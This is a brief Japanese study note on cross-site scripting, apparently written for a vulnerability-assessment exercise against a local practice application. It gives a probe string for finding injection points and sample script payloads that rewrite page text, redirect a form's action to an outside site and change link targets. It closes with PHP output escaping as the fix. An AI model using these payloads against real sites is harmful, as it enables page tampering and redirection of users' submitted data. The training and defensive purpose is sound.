# XSS

* 現在も脆弱性の届け出が一番多い
* JavaScriptを使って攻撃する


## 脆弱性の発見方法

```
'>"><hr>
```
を入力する.\<hr>を有効にするためにタグや文字列を閉じることを
期待し、「'>">」をおまじない的に入れる。

## 攻撃手法
②脆弱性からどのようなスクリプトが実行できるかを検討する。
HTMLやBURPを利用して攻撃コードを作成する。

name項目に脆弱性あった場合のサンプル

- titleのidを書き換える。
```
http://localhost/Users/_personal/Web/Scenario1121/VulSoft/enquete.php?page=2&sex=0&old=1&company=&xss=1&trouble=1&content=&name=<script>document.getElementById("title").innerHTML='書き換えた値'</script>
```

- action属性を書き換える
```
http://localhost/Users/_personal/Web/Scenario1122/VulSoft/enquete.php?page=2&name=&old=&company=&content=&name=<script>document.getElementById("enquete_form").action='http://google.com'</script>
```


* 脆弱性のあるフォームに以下のような形でスクリプトを
挿入する

```HTML
'>"><script>document.getElementById("link0").href='google.com'</script>
```

## 対策
・入力項目などをサーバー側でクライアントに送信する前にエスケープ
する。
![](/%E8%84%86%E5%BC%B1%E6%80%A7%E8%A8%BA%E6%96%AD/web%E8%84%86%E5%BC%B1%E6%80%A7/img/%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97.png)
→phpだとhtmlspecialchars関数を利用する

```php
$value = htmlspecialchars(nl2br($row[$k]), ENT_QUOTES, "UTF-8");
```